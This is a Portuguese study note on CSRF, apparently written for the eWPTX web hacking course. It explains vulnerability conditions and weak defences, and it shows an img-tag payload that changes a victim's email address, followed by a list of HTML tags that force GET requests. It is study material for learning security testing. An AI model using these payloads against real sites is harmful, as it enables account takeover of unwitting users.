#INE #WebHacking #eWPTX 

# CSRF: Recap & More

O ataque de CSRF permite explorar a relação de confiança entre a aplicação web e as requisições HTTP feitas pelo usuário. 

Uma aplicação está vulnerável a CSRF se:
- Para validar a sessão a aplicação depende de mecanismos como Cookies e Basic Auth, que são injetados automaticamente pelo navegador
- O atacante consegue determinar todos os parâmetros necessários para realizar uma requisição maliciosa

Para explorar o CSRF com sucesso o atacante precisa:
- Que a vitima tenha uma sessão ativa e válida quando executar a requisição maliciosa
- Conseguir forjar uma requisição em nome da vítima

Os 2 principais cenários onde a vulnerabilidade ocorre são:
- Ausência de defesa contra CSRF
- Fraqueza na implementação dos mecanismos de defesa como: cookie-only, tela de confirmação, usar POST, checar o referer header

# Attack Vectors
## Force Browsing with GET

Como já se sabe, a vulnerabilidade acontece quando o atacante consegue forçar o browser da vítima a fazer uma requisição na aplicação alvo

**Exemplo**

Imaginando um cenário onde o usuário consegue alterar o seu email simplesmente informando o endereço novo

```html
// Por padrão o form usa o método GET
...
<form action="change.php">
	<label name="email">Your email is: <b>myC00Lemail@victim.site</b></label>
	<input type="hidden" name="old" value="myC00Lemail@victim.site">
	<label name="email">New email</label>
	<input type="email" name="new" placeholder="your new email" required>
	<input type="submit" value="Confirm">
</form>
...
```

Nesse caso, não existe nenhuma proteção contra CSRF, então, para explorar a vulnerabilidade é preciso gerar uma requisição GET no navegador da vítima. Para isso pode-se usar a tag img

```html
<img src='http://victim.site/csrf/changeemail/change.php?old=mycoolemail%40victim.site&new=evil%40hacker.site'>
```

Para enviar o payload para a vítima pode-se usar uma outra vulnerabilidade, como XSS ou injeção de HTML, ou ainda, usar engenharia social

Além da tag img, existem várias outras que forçam o browser a fazer uma requisição GET

```html
// Requer interação do usuário
<a href=URL>click here
<form><input formaction=URL>
<button formaction=URL>
...

// Não requer a interação do usuário
<iframe src=URL>
<script src=URL>
<input type="image" src=URL alt="">
<embed src=URL>
<audio src=URL>
<video src=URL>
<source src=URL>
<video poster=URL>
<link rel="stylesheet" href=URL>
<object data=URL>
<body background=URL>
<div style="background:url(URL)">
<style>body { background:url(URL) }</style>
...
```

## Post Requests

